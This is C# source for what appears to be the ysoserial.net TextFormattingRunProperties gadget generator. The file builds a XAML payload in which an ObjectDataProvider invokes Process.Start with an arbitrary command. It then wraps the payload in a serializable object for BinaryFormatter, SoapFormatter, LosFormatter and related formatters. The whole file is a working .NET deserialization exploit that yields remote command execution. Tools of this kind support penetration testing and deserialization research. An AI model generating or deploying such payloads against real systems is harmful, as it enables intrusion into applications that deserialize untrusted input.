using System;
using System.Runtime.Serialization;
using System.Collections.Generic;
using Microsoft.VisualStudio.Text.Formatting;

namespace ysoserial.Generators
{
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {

        }

        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }

    class TextFormattingRunPropertiesGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "TextFormattingRunProperties";
        }

        public override string Description()
        {
            return "TextFormattingRunProperties gadget";
        }

        public override string Credit()
        {
            return "Oleksandr Mirosh and Alvaro Munoz";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
        {
            Boolean hasArgs;
            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);

            String cmdPart;

            if (hasArgs)
            {
                cmdPart = $@"<System:String>"+ splittedCMD[0] + @"</System:String>
        <System:String>""" + splittedCMD[1] + @""" </System:String>";
            }
            else
            {
                cmdPart = $@"<System:String>" + splittedCMD[0] + @"</System:String>";
            }

            string xaml_payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:System=""clr-namespace:System;assembly=mscorlib""
  xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system"">
	 <ObjectDataProvider x:Key="""" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" >
     <ObjectDataProvider.MethodParameters>
        "+ cmdPart + @"
     </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";

            if (minify)
            {
                xaml_payload = Helpers.XMLMinifier.Minify(xaml_payload, null, null);
            }

            TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
            return Serialize(payload, formatter, test, minify);
        }

    }
}
